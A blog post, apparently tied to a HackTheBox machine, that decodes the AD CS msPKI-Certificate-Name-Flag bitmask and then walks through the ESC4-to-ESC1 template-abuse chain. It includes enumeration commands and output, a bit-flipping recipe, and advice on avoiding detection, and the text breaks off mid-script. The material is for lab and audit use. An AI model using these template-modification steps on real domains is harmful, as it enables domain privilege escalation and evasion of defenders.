---
layout: post
title: "Read the Bits, Not the Integer: msPKI-Certificate-Name-Flag and the ESC4➜ESC1 Chain"
categories: [ADCS]
tags: [msPKI-Certificate-Name-Flag, adcs, esc1, esc4, certifried, cve-2022-26923, ms-crtd, ms-wcce]
wide: true
pinned: true
tag_anchors:
  esc1: "#the-two-mode-framework--what-makes-a-template-abusable"
  esc4: "#the-two-mode-framework--what-makes-a-template-abusable"
  certifried: "#ct_flag_subject_alt_require_dns--the-bit-that-enabled-certifried"
  cve-2022-26923: "#ct_flag_subject_alt_require_dns--the-bit-that-enabled-certifried"
  msPKI-Certificate-Name-Flag: "#the-13-defined-bits"
  adcs: "#the-two-mode-framework--what-makes-a-template-abusable"
  ms-crtd: "#the-canonical-sources"
  ms-wcce: "#the-canonical-sources"
---

`-1577058304` on [PingPong](https://app.hackthebox.com/machines/PingPong). `0` on Westbridge, weeks later. Same attribute — `msPKI-Certificate-Name-Flag` — two answers, one negative, one blank, and Google had nothing useful for either: the same copied 5-row table everywhere, none of it able to decode a negative number or explain what the CA would *do* with it. At that point the white rabbit was already running, and the only option was to follow — into the spec, into the bitmask, into two live boxes. It started as an appendix to the Westbridge writeup. It was too big for an appendix, so it became this.

The `msPKI-Certificate-Name-Flag` attribute is frequently explained using an oversimplified, inaccurate sequential bitmask in Active Directory Certificate Services (AD CS) write-ups. If you are relying on community cheat sheets to identify [ESC1](#the-two-mode-framework--what-makes-a-template-abusable) or [ESC4](#the-two-mode-framework--what-makes-a-template-abusable) vulnerabilities, you might be missing critical attack paths due to a fundamental misunderstanding of how this attribute is structured.

This post uses the official Microsoft protocol specifications as the source of truth to decode the exact values, expose the common "5-row table" fallacy, and provide a definitive reference for offensive operators and detection engineers. The second half is a full end-to-end run of the ESC4 ➜ ESC1 chain on the live HackTheBox machine [PingPong](https://app.hackthebox.com/machines/PingPong) — every command, every output, every failure.

### TL;DR

`msPKI-Certificate-Name-Flag` is a bitmask — not a boolean. And yes: in a lab, `bloodyAD set object ... -v 1` gives you the same forged cert. Everyone who says "just 0➜1, what's the use" is right — until the baseline has bits you can't afford to lose. On PingPong the baseline is `0xa2000000`: three require-bits encoding UPN, email, and directory-path requirements. A dirty write of `1` wipes all three — the template stops building identities from AD, someone's smartcard auth changes shape, and the blue team gets a ticket. The correct move is an OR: read the existing value, compute `existing | 1`, write back the combined result. `0xa2000000 ➜ 0xa2000001` is a one-bit delta and a clean exploit. `0xa2000000 ➜ 0x00000001` is a demolition. In a CTF lab, none of this matters. **In a real engagement, it's the difference between a clean op and getting caught because someone's smartcard stopped working.** Read the baseline. OR into it.

> **Context — what this post is.** The attack-class background for *why* a writable certificate template is [ESC4](https://posts.specterops.io/certified-pre-owned-d959034265de) (SpecterOps' *Certified Pre-Owned* by Will Schroeder and Lee Christensen, 2021), and the case study of one require-bit being abused in production — [CVE-2022-26923 / Certifried](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained) — are linked from the relevant sections below. This post focuses on the bitmask itself — the *value* of each bit, the *behaviour* it triggers on the CA — and then weaponises it live.

## The Canonical Sources

To understand how this flag actually works, we have to look past the Windows GUI and read the documentation that dictates the protocol. There are three sources of truth, in order of authority:

1. **[MS-CRTD] (Certificate Templates Structure):** The Open Spec that defines every certificate-template attribute. [Section 2.4 of MS-CRTD](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/11f578e0-15ff-4d2c-86bb-206c50153d89#3-structure-example) defines the bitmask. This is the only spec that *defines* the values.
2. **[MS-WCCE] (Windows Client Certificate Enrollment Protocol):** The on-wire protocol. [Section 3.2.2.6.2.1.4.5.9 of MS-WCCE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/a1f27ffb-7f74-4fa1-8841-7cde4ba0bcfe#322621459-mspki-certificate-name-flag) describes what the CA *MUST* or *SHOULD* do on the wire when a bit is set. Use this for the *behavior* of a bit.
3. **The Microsoft Learn AD-schema page:** Documentation only. It confirms the attribute is a 4-byte, single-valued field on `PKI-Certificate-Template` requiring Domain Admin to update, but it does *not* enumerate the bits.

## The 13 Defined Bits

The attribute is a 4-byte sparse bitmask. Thirteen bits are defined in MS-CRTD; the remaining 19 bits are unused (or reserved) — some third-party CA products encode vendor-specific signals in those bits, but they have no Microsoft-defined meaning. The bits fall into two distinct operational groups:

* **Supply bits:** Who picks the identity inside the certificate.
* **Require bits:** What identity format the CA will accept; the CA *MUST* read that field from the requester's AD object and bake it into the cert.

| Bit | Hex value | Dec value | Flag name | Group | Behaviour |
|---|---|---|---|---|---|
| 0 | `0x00000001` | 1 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | supply | Requester supplies the **Subject DN** in the CSR. Without this bit, the CA builds the Subject per the template's own subject-name policy. |
| 3 | `0x00000008` | 8 | `CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME` | supply | Renewal-only. Instructs the client to reuse the subject name and SAN from an existing valid certificate when building a renewal CSR — i.e. the client copies them from the prior cert instead of asking the requester to re-supply them. |
| 16 | `0x00010000` | 65 536 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` | supply | Requester supplies the **SAN** in the CSR. This is the bit that turns the cert into a forgeable identity token. |
| 22 | `0x00400000` | 4 194 304 | `CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS` | require | CA *SHOULD* retrieve the domain DNS information policy and use it to populate the SAN. (This is `SHOULD`, not `MUST`). |
| 23 | `0x00800000` | 8 388 608 | `CT_FLAG_SUBJECT_ALT_REQUIRE_SPN` | require | CA *MUST* add the value of the `servicePrincipalName` attribute from the requestor's AD object to the SAN extension. |
| 24 | `0x01000000` | 16 777 216 | `CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID` | require | CA *MUST* add the value of the `objectGuid` attribute from the requestor's user object to the SAN extension. |
| 25 | `0x02000000` | 33 554 432 | `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` | require | CA *MUST* add the value of the `userPrincipalName` attribute from the requestor's user object to the SAN. **This bit alone stops [Certifried (CVE-2022-26923)](https://nvd.nist.gov/vuln/detail/CVE-2022-26923) by forcing the UPN to be read from the requester, not supplied.** |
| 26 | `0x04000000` | 67 108 864 | `CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` | require | CA *MUST* add the value of the `mail` attribute from the requestor's user object to the SAN extension. |
| 27 | `0x08000000` | 134 217 728 | `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` | require | CA *MUST* add the value of the `dNSHostName` attribute from the requestor's computer object to the SAN extension. **This bit enabled [Certifried (CVE-2022-26923)](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained).** |
| 28 | `0x10000000` | 268 435 456 | `CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN` | require | If bit #31 is **not** set, the CA *MUST* set the Subject `CN` to the requestor's `dNSHostName` (machine certs) or `cn` (user certs). |
| 29 | `0x20000000` | 536 870 912 | `CT_FLAG_SUBJECT_REQUIRE_EMAIL` | require | CA *MUST* set the Subject field to a DN whose `E` (email) component comes from the requestor's `mail` attribute. |
| 30 | `0x40000000` | 1 073 741 824 | `CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME` | require | If bit #31 is **not** set, the CA *MUST* set the Subject `CN` to the requestor's `cn`. |
| 31 | `0x80000000` | 2 147 483 648 *(signed: −2 147 483 648)* | `CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH` | require | CA *MUST* set the Subject field to the requestor's full distinguishedName from the directory. Takes precedence over bits 28 and 30. |

> **Signed-int32 trap.** The attribute is a 4-byte unsigned bitmask, but most LDAP clients — `bloodyAD`, `ldapsearch`, ADUC — return it as a *signed* int32. That means any template with the high bit set (bit 31 alone, or combinations including it) comes back negative. A template whose flag value is `0xa6000000` is what the spec calls a "user template shape"; what your tooling will print is `-1509949440`. **Always convert the returned value to unsigned hex before doing bit comparisons** — `val & 0x10000 != 0` is correct, `val == 1` is not.

## The Two-Mode Framework — What Makes a Template Abusable

A template is **"safe"** (cannot be abused for impersonation) if and only if none of the supply bits (Bit 0, 3, 16) are set. In this case, the CA builds the cert's identity from the requester's AD object per the require bits — the requester can submit *any* CSR but the resulting cert will still be bound to *their* AD identity, not the one they typed into the CSR.

A template is **"abusable"** the moment any supply bit is set *and* the requester meets the template's enrollment rights. Concretely:

* Bit 0 set ➜ the requester chooses the **Subject DN**. Submit a CSR with `Subject = CN=Administrator,...` and the CA signs it as-is.
* Bit 16 set ➜ the requester chooses the **SAN**. Submit a CSR with `SAN UPN = administrator@domain` and the CA signs it as-is. This is the canonical [ESC1](https://posts.specterops.io/certified-pre-owned-d959034265de) — a forgeable identity token.
* Bit 3 set ➜ renewal-only version of the same primitive; less common as an attack surface.

The require bits *do not* by themselves make a template abusable. They constrain what the CA will populate; they never let the requester override the requester's own identity. A template with only `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` and `CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME` set (e.g. `0x42000000`) is a perfectly safe user/workstation template.

The dangerous combination is **any supply bit + any require bits**: a template with Bit 16 + Bit 24 (`0x01010000`, decimal 16 843 776 — the example in the next section) is abusable *and* has its forgery anchored to a Directory GUID the requester still has to be authorised for, which is what makes combined values fly under "static integer" detection.

## The "5-Row Sequential" Fallacy

Many community writeups and cheat sheets erroneously reduce this 32-bit sparse bitmask into a fake 1-through-5 sequential progression. This stems from researchers clicking through the `certtmpl.msc` GUI dropdowns and assuming the underlying LDAP values increment sequentially (1, 2, 3, 4, 5).

Some writeups reference the old-cert flag but map it to the decimal value `4`. In reality, the `CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME` flag exists, but its actual value is `0x00000008` (decimal 8). There is no `0x2` and no `0x4` in the attribute's valid set.

Teaching operators to look exclusively for isolated integers like `1` or `65536` causes them to overlook critical ESC1 vulnerabilities. A template might have the SAN supply bit set (`0x00010000`) but also require a Directory GUID (`0x01000000`), resulting in a combined decimal value like `16842752`. If your tooling or cheat sheet is only searching for a static `1` or `65536`, you will completely miss the vulnerability.

## `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` — The Bit That Enabled Certifried

Bit 27 (`0x08000000`, `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS`) deserves its own note because it's the require-bit that turned a configuration mistake into a domain-takeover CVE.

The bit tells the CA: *"When you issue this certificate, copy the requestor's `dNSHostName` attribute into the SAN extension."* For a normal machine cert this is fine — the requesting computer's `dNSHostName` is a property the domain already trusts. The vulnerability was that **any user with the right to create a machine account** could create a new machine, set its `dNSHostName` to anything they wanted (e.g. the DC's hostname), enroll against the (otherwise safe) machine-template that had this bit set, and receive a certificate with the DC's `dNSHostName` in the SAN. From there, NTLM-relay-to-LDAP or PKINIT-style attacks turned that cert into Domain Admin.

Microsoft's fix (May 2022, [CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)) was to change how the KDC validates the SAN-`dNSHostName` ↔ AD-object mapping during PKINIT, not to deprecate the bit itself. Templates with this bit set remain common in production; what changed was the KDC's willingness to honour a cert whose SAN `dNSHostName` doesn't resolve to the requester's actual machine object.

The mirror image — the bit that would have *prevented* Certifried against an attacker who tried to *supply* the UPN — is Bit 25 (`CT_FLAG_SUBJECT_ALT_REQUIRE_UPN`). That bit forces the CA to populate the SAN's UPN from the requester's AD `userPrincipalName`, making the requester-supplied SAN impossible. Templates with `SUBJECT_ALT_REQUIRE_DNS` (bit 27) but without `SUBJECT_ALT_REQUIRE_UPN` (bit 25) on a user-enrollable machine template are the exact pre-Certifried shape to look for during an audit.

## How To Actually Read It — Operators and Auditors

**Step 1 — pull the attribute from a known template.** The attribute lives on the template object under `CN=<Template>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>`. Two equivalent reads — `bloodyAD` and raw `ldapsearch -Y GSSAPI` (Kerberos bind using a ccache):

```zsh
➜ bloodyAD -d ping.htb --host dc1.ping.htb \
    -u r.martinelli -k ccache=r.martinelli.ccache \
    get object 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    --attr msPKI-Certificate-Name-Flag

distinguishedName: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
msPKI-Certificate-Name-Flag: -1577058304
```

```zsh
## Alt — raw ldapsearch, no third-party tooling:
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc1.ping.htb -Y GSSAPI -N \
    -b 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    msPKI-Certificate-Name-Flag

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services
 ,CN=Services,CN=Configuration,DC=ping,DC=htb
msPKI-Certificate-Name-Flag: -1577058304
```

`-1577058304` (= `0xa2000000` unsigned) = three require-bits set, no supply bits. That's a **safe baseline** with three explicit guardrails baked in: `SUBJECT_ALT_REQUIRE_UPN` (the anti-Certifried bit that forces the UPN to be read from the requester's AD object, not supplied), `SUBJECT_REQUIRE_EMAIL`, and `SUBJECT_REQUIRE_DIRECTORY_PATH`. The CA builds the cert's identity from the requester's AD object per those require-bits — the requester can submit *any* CSR but the resulting cert will still be bound to *their* AD identity, not the one they typed.

**Step 2 — enumerate *every* template, not just one.** Drop the leaf-CN from the search base and pull three attributes at once — `msPKI-Certificate-Name-Flag` (the bitmask), `pKIExtendedKeyUsage` (which EKUs the template issues), and `displayName` (so the output is human-readable). Together these three determine what the cert will look like and what it will be trusted for:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc1.ping.htb -Y GSSAPI -N \
    -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    '(objectClass=pKICertificateTemplate)' \
    msPKI-Certificate-Name-Flag displayName pKIExtendedKeyUsage

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Con
 figuration,DC=ping,DC=htb
displayName: User
pKIExtendedKeyUsage: 1.3.6.1.4.1.311.10.3.4
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.4
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2
msPKI-Certificate-Name-Flag: -1509949440

...[snip — 33 more templates]...

dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services
 ,CN=Services,CN=Configuration,DC=ping,DC=htb
displayName: Smartcard Authentication
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.4
pKIExtendedKeyUsage: 1.3.6.1.4.1.311.10.3.4
msPKI-Certificate-Name-Flag: -1577058304
```

`SmartcardAuthentication` carries Client Authentication (`1.3.6.1.5.5.7.3.2`) — the EKU that makes a forged cert PKINIT-viable. That's the second half of the ESC1 condition, sitting there waiting for the first.

If you don't want to enumerate by hand, [`certipy find`](https://github.com/ly4k/Certipy) classifies every template into ESC1–ESC15 — useful as a starting point and a cross-check:

```zsh
➜ env KRB5CCNAME=c.roberts.ccache \
certipy find \
    -target dc1.ping.htb \
    -u 'c.roberts@ping.htb' -k -no-pass \
    -vulnerable -stdout

...[snip]...
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

Certipy's verdict is *seat-dependent* — it only reports an ESC4 when the principal running the census has dangerous permissions on the template. From a low-priv seat it sees only the box's other AD CS story (ESC13 on `TemporaryWinRM`); the ESC4 shows up later, once write is in hand. Its JSON output can be filtered down to just the vulnerable templates:

```zsh
➜ jq -r '.["Certificate Templates"] | to_entries[] | select(.value.["[!] Vulnerabilities"] != null and .value.["[!] Vulnerabilities"] != "") | "\(.key)\t\(.value.["Template Name"])\t\(.value.["[!] Vulnerabilities"])"' 20260905025554_Certipy.json

0       SmartcardAuthentication {"ESC4":"User has dangerous permissions."}
1       TemporaryWinRM  {"ESC13":"Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'."}
```

Two templates matter on this box: `SmartcardAuthentication` (the ESC4 this post chases) and `TemporaryWinRM` (the ESC13 foothold route). The walkthrough below is about the first one.

**Step 3 — convert to unsigned hex.** Whatever the tool printed, force it into an unsigned 32-bit field before bit-comparison. The minimum-viable Python:

```python
def decode_flag(val: int) -> list[str]:
    """Return the names of every set CT_FLAG_* bit in `val`."""
    val &= 0xFFFFFFFF                       # force unsigned 32-bit
    names = {
        0x00000001: "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT",
        0x00000008: "CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME",
        0x00010000: "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME",
        0x00400000: "CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS",
        0x00800000: "CT_FLAG_SUBJECT_ALT_REQUIRE_SPN",
        0x01000000: "CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID",
        0x02000000: "CT_FLAG_SUBJECT_ALT_REQUIRE_UPN",
        0x04000000: "CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL",
        0x08000000: "CT_FLAG_SUBJECT_ALT_REQUIRE_DNS",
        0x10000000: "CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN",
        0x20000000: "CT_FLAG_SUBJECT_REQUIRE_EMAIL",
        0x40000000: "CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME",
        0x80000000: "CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH",
    }
    return [n for mask, n in names.items() if val & mask]

# Example: a template bloodyAD prints as "-1509949440" decodes to:
print(decode_flag(-1509949440))
# ['CT_FLAG_SUBJECT_ALT_REQUIRE_UPN',
#  'CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL',
#  'CT_FLAG_SUBJECT_REQUIRE_EMAIL',
#  'CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH']
```

That input is `0xa6000000` — the worked example from MS-CRTD Section 2.4 (a standard user-template shape: UPN + email required into SAN, full DN required into Subject).

**Step 4 — apply the two-mode framework.** After decoding, ask exactly two questions:

1. **Is any supply bit set?** (`0x1`, `0x8`, `0x10000`.) If yes, the template is abusable by anyone who can meet its enrollment rights — that's your [ESC1](https://posts.specterops.io/certified-pre-owned-d959034265de) (or, on the SAN side, an ESC4➜ESC1 chain if the attacker has `Write`/`WriteDacl` on the template object).
2. **For machine templates specifically: is `SUBJECT_ALT_REQUIRE_DNS` set without `SUBJECT_ALT_REQUIRE_UPN`?** If yes, that's the [Certifried](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained) pre-patch shape and the template needs `pKIExtendedKeyUsage`, enrollment rights, and manager approval all reviewed together.

If both questions are "no," the template is safe at the name-flag layer. The remaining attack surface for that template is elsewhere — `pKIExtendedKeyUsage` (any dangerous EKU?), `msPKI-RA-Signature` (any manager approval?), `ntSecurityDescriptor` (who can write?), `EnrollmentFlags`/`PrivateKeyFlags` — but the **name-flag is not your problem there.**

## The OPSEC Trap — Appending vs. Overwriting

When running an ESC4 ➜ ESC1 chain, the tempting command is `bloodyAD set object ... msPKI-Certificate-Name-Flag -v 1`. It works in a CTF. On a live engagement it's a helpdesk ticket waiting to happen.

`msPKI-Certificate-Name-Flag` is a unified bitmask — *every* write replaces the whole field. Setting it to `1` doesn't "add" `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`; it *wipes* everything else that was set. The HackTheBox machine [PingPong](https://app.hackthebox.com/machines/PingPong) ships a `SmartcardAuthentication` template with three require-bits baseline:

```
0xa2000000  =  bit 25 (SUBJECT_ALT_REQUIRE_UPN)         ← anti-Certifried guard
            +  bit 29 (SUBJECT_REQUIRE_EMAIL)
            +  bit 31 (SUBJECT_REQUIRE_DIRECTORY_PATH)
```

Running `-v 1` against that template wipes all three — `UPN-require` is the one that *stops* [Certifried (CVE-2022-26923)](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained) by forcing the UPN to be read from the requester's AD object instead of supplied. You get your ESC1 path *and* simultaneously remove the template's anti-Certifried guardrail. Verified live on 2026-09-04: baseline `0xa2000000` ➜ `-v 1` ➜ `0x00000001` (re-read via `ldapsearch -Y GSSAPI`, confirmed).

**The classic move is a bitwise OR, not a static write.** Read the existing value, OR in the supply bit you want, write the combined result back. Every original require bit survives untouched:

```python
# What bloodyAD / ldapsearch printed (signed int32 — high bit set makes it negative)
existing = -1577058304

# Force unsigned 32-bit, OR in the Subject-supply bit (0x1) — the one that opens
# certipy req -upn on the PingPong template. For SAN-supply instead, OR 0x10000.
new = (existing & 0xFFFFFFFF) | 0x1
print(f'0x{new:08x}  ({new})')
# 0xa2000001  (2717908993)   signed: -1577058303
```

Same write, same ESC1 capability, original require bits intact. The principle: **never overwrite the bitmask, always OR into it.** The full end-to-end proof of both forms is the walkthrough below.

## Real Domain Walkthrough — PingPong, Live 2026-09-04

### The Box and the Seat

PingPong is a two-forest box. `PING.HTB` hosts the PKI — the CA `ping-DC1-CA` on `dc1.ping.htb`, and every template in its Configuration partition. `PONG.HTB` is a trusted partner forest where the foothold lives: `r.martinelli`, authenticated with an AES key (redacted in the commands — the box is still active on HTB). BloodHound's foreign security principal edges are what pointed at the path — the `r.martinelli` seat in `PONG.HTB` resolves to write rights on the `SmartcardAuthentication` template object in `PING.HTB`'s Configuration partition. **One forest writes, the other forest enrolls.** That split is the whole story of the box, and it dictates every tool choice below. The addresses:

```zsh
# /etc/hosts — DC1's VPN-facing IP rotates per spawn; DC2 is stable:
10.129.245.56    DC1.ping.htb ping.htb   DC1
192.168.2.2      DC2.pong.htb pong.htb   DC2

# Same, as shell variables:
➜ export target_dc01_ip=10.129.245.56
➜ export target_dc02_ip=192.168.2.2
```

```zsh
# Generate a TGT
➜ getTGT.py 'pong.htb/r.martinelli' \
    -aesKey [REDACTED] \
    -dc-ip $target_dc02_ip

# Cross-Realm LDAP Ticket
➜ env KRB5CCNAME='r.martinelli.ccache' \
kvno ldap/dc1.ping.htb

ldap/dc1.ping.htb@PING.HTB: kvno = 7
```

A TGT from the PONG KDC — nothing special yet. But it's a ticket for a *different* forest than the one we're about to attack, and that's the wrinkle the whole box hangs on. `kvno` asks the PONG KDC for a service ticket to `ldap/dc1.ping.htb`; the PONG KDC doesn't own that SPN, so it issues a cross-realm referral. The system's native `libkrb5` hops to the PING KDC and the service ticket lands in the ccache — silently, correctly. Impacket cannot make this hop. Every tool choice from here on is decided by that sentence.

### The Wall — Certipy Meets dc2

> *"How I Learned to Stop Worrying and Love GSSAPI"*

First instinct: `certipy find` against the home domain controller. It has to fail four different ways before the manual route earns its place.

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
certipy find -k -no-pass \
    -ldap-scheme ldap \
    -target dc2.pong.htb -dc-ip $target_dc02_ip \
    -stdout -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 0 certificate templates
[*] Finding certificate authorities
[*] Found 0 certificate authorities
[*] Found 0 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 0 OIDs linked to templates
[*] Enumeration output:
Certificate Authorities                 : [!] Could not find any CAs
Certificate Templates                   : [!] Could not find any certificate templates
```

Attempt one *worked* — signed GSSAPI, authenticated, seventeen seconds — and found nothing. Certipy isn't broken. It's answering a question about the wrong forest.

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
certipy find -k -no-pass \
    -ldap-scheme ldap -no-ldap-signing \
    -target dc2.pong.htb -dc-ip $target_dc02_ip \
    -stdout -vulnerable

[-] LDAP Kerberos authentication failed: {'result': 8, 'description': 'strongerAuthRequired', 'dn': '', 'message': '00002028: LdapErr: DSID-0C090341, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4f7c\x00', 'referrals': None, 'saslCreds': b'\xa1\x140\x12\xa0\x03\n\x01\x00\xa1\x0b\x06\t*\x86H\x82\xf7\x12\x01\x02\x02', 'type': 'bindResponse'}
[-] Got error: LDAP authentication refused because LDAP signing is required. Try one of these options:
- Remove '-no-ldap-signing' to enable LDAP signing
- Use '-ldap-scheme ldaps' to use TLS encryption
- Use '-ldap-simple-auth' for SIMPLE bind authentication
[-] Use -debug to print a stacktrace
```

Attempt two is the real lesson: `strongerAuthRequired`. DC2 requires integrity protection on every bind. Even with a valid Kerberos ticket, `-no-ldap-signing` tells Impacket to strip the GSSAPI signature from the LDAP packets — the DC's response is *request the integrity check or don't talk to me*. The manual route (`ldapsearch -Y GSSAPI`, no extra flags) negotiates signing automatically. One flag's difference between a refusal and a session.

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
certipy find -k -no-pass \
    -ldap-scheme ldap -ldap-simple-auth \
    -target dc2.pong.htb -dc-ip $target_dc02_ip \
    -stdout -vulnerable

# ...same enumeration as attempt one...
Certificate Authorities                 : [!] Could not find any CAs
Certificate Templates                   : [!] Could not find any certificate templates
```

Attempt three binds and gets the same zero — consistent with an empty PKI, though a simple bind without a password is the weakest evidence of the three. The *proof* is the signed query below.

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
certipy find -k -no-pass \
    -ldap-scheme ldap -ldap-scheme ldaps \
    -target dc2.pong.htb -dc-ip $target_dc02_ip \
    -stdout -vulnerable

[-] Got error: ("('socket ssl wrapping error: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1010)',)",)
[-] Use -debug to print a stacktrace
```

Attempt four tries LDAPS. Port 636 on dc2 doesn't just reject — it drops the TLS handshake mid-flight. No TLS there. (And yes, the doubled `-ldap-scheme` is the command as it ran — argparse keeps the last value, so this is just `-ldap-scheme ldaps`. A typo that happened to point the same way as the intent. Flip the order and it silently does plain LDAP — same typo, ten minutes of confusion.)

### The Verdict — PONG Has No PKI

The native way settles it. Same seat, same signed bind that satisfied DC2's enhanced security, but pointed at both halves of the Configuration partition:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc2.pong.htb -Y GSSAPI -N \
    -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=pong,DC=htb' \
    '(objectClass=pKIEnrollmentService)' certificateTemplates

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
```

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc2.pong.htb -Y GSSAPI -N \
    -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pong,DC=htb' \
    '(objectClass=pKICertificateTemplate)' name

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
```

Definitive proof. GSSAPI session negotiated at SSF 256 — DC2's integrity requirement satisfied — and both queries return *absolutely nothing*. Zero Enterprise CAs, zero certificate templates. The directory is queryable; it's just empty of the objects we're hunting. The PKI doesn't exist in PONG. It lives across the trust, in PING, which is why automated tooling run blindly against the home DC finds nothing, and why mapping those Foreign Security Principals in BloodHound was the linchpin that found the ESC4 in the first place.

### Manual Enumeration — The Classic Way

Back across the trust. The write seat checks what it can touch:

```zsh
➜ bloodyAD -d ping.htb --host dc1.ping.htb \
    -u r.martinelli -k ccache=r.martinelli.ccache \
    -s get writable --partition CONFIGURATION

distinguishedName: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
permission: WRITE
OWNER: WRITE
DACL: WRITE
```

Jackpot. `SmartcardAuthentication` comes back writable — OWNER, DACL, the lot. That's ESC4: control of the template object means control of what the CA will sign. `bloodyAD` handles the boundary better than certipy because it separates the authentication realm from the target domain (`-d ping.htb` while authenticating as `r.martinelli@PONG.HTB`).

Now the CA itself, and the templates it issues from:

```zsh
➜ env KRB5CCNAME='r.martinelli.ccache' \
ldapsearch -LLL -H ldap://dc1.ping.htb -Y GSSAPI -N \
    -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    '(objectClass=pKIEnrollmentService)' certificateTemplates

SASL/GSSAPI authentication started
SASL username: r.martinelli@PONG.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=ping-DC1-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,C
 N=Configuration,DC=ping,DC=htb
certificateTemplates: SmartcardAuthentication
certificateTemplates: TemporaryWinRM
certificateTemplates: DirectoryEmailReplication
certificateTemplates: DomainControllerAuthentication
certificateTemplates: KerberosAuthentication
certificateTemplates: EFSRecovery
certificateTemplates: EFS
certificateTemplates: DomainController
certificateTemplates: WebServer
certificateTemplates: Machine
certificateTemplates: User
certificateTemplates: SubCA
certificateTemplates: Administrator
```

There's the CA — `ping-DC1-CA` — and the thirteen templates it will issue from. `SmartcardAuthentication` is on the list. The CA lives in PING, the writable template lives in PING, only our seat lives in PONG.

Then the bulk census. This is the parser — it splits ldapsearch output by blank line, extracts each template's `displayName` and `msPKI-Certificate-Name-Flag`, converts to unsigned hex, and flags anything with a supply bit:

```python
#!/usr/bin/env python3
import sys
import re

def parse_templates():
    data = sys.stdin.read()
    hits = []

    # Split by LDAP entry blocks
    blocks = data.split("\n\n")
    for block in blocks:
